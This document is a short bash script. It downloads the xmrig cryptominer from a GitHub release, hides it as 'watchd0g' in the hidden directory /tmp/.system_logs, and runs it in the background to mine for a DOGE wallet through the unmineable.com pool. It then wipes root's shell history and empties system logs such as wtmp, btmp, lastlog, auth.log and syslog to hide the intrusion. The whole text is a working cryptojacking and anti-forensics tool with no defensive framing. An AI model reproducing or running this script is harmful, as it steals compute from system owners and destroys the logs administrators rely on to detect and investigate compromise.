#!/bin/bash

cd /tmp && mkdir .system_logs && cd .system_logs

wget https://github.com/momika233/xmrig/files/15147153/momika233-2024-04-29-xmrig.zip && unzip momika233-2024-04-29-xmrig.zip && mv xmrig watchd0g && rm -rf momika233-2024-04-29-xmrig.zip

chmod 777 /tmp/.system_logs/watchd0g && cd /tmp/.system_logs/ && ./watchd0g -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u DOGE:ABD2rC2db5GpW5NV2pokydMeccWDnSaFf3.unmineable_worker_alhxp -p x -B && echo "exit" > /root/.zsh_history

history -c

echo > /var/log/wtmp
echo > /var/log/btmp
echo>/var/log/lastlog
echo > /var/log/secure
echo > /var/log/messages
echo>/var/log/syslog
echo>/var/log/xferlog
echo>/var/log/auth.log
echo>/var/log/user.log
cat /dev/null > /var/adm/sylog
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/openwebmail.log
cat /dev/null > /var/log/mail.info
echo>/var/run/utmp
cd  /root/
echo > .bash_history
history -c
